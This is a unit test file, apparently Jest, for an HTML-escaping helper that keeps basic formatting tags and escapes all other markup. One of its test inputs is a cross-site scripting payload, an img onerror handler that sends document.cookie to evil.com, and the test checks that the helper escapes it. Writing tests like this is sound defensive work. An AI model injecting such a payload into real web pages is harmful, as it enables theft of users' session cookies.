import { EscapingHelpers } from '../../../src/utilities/helpers/escaping-helpers';

describe('EscapingHelpers', () => {
  describe('sanatizeHtmlExceptTextFormatting', () => {
    it('should return empty string when no argument is passed', () => {
      const result = EscapingHelpers.sanatizeHtmlExceptTextFormatting();
      expect(result).toEqual('');
    });

    it('should sanitize given string with allowed html tags', () => {
      const text = '<i> <b> <br> <mark> <strong> <em> <small> <del> <ins> <sub> <sup>';
      const result = EscapingHelpers.sanatizeHtmlExceptTextFormatting(text);
      expect(result).toEqual('<i> <b> <br> <mark> <strong> <em> <small> <del> <ins> <sub> <sup>');
    });

    it('should sanitize given string with not allowed html tags', () => {
      const text = '<a> <img> <div> <span> <button> <table> <script>';
      const result = EscapingHelpers.sanatizeHtmlExceptTextFormatting(text);
      expect(result).toEqual(
        '&lt;a&gt; &lt;img&gt; &lt;div&gt; &lt;span&gt; &lt;button&gt; &lt;table&gt; &lt;script&gt;'
      );
    });

    it.each([
      {
        input: 'Are you sure <b>you want</b> to do this?',
        output: 'Are you sure <b>you want</b> to do this?'
      },
      {
        input: '<img src="https://example.com/logo.png" />',
        output: '&lt;img src=&quot;https://example.com/logo.png&quot; /&gt;'
      },
      {
        input: '<img src=x onerror="fetch(\'https://evil.com?\'+document.cookie)">',
        output: '&lt;img src=x onerror=&quot;fetch(&#39;https://evil.com?&#39;+document.cookie)&quot;&gt;'
      }
    ])('should sanitize random text with html tags', async (data) => {
      const result = EscapingHelpers.sanatizeHtmlExceptTextFormatting(data.input);
      expect(result).toEqual(data.output);
    });
  });
});
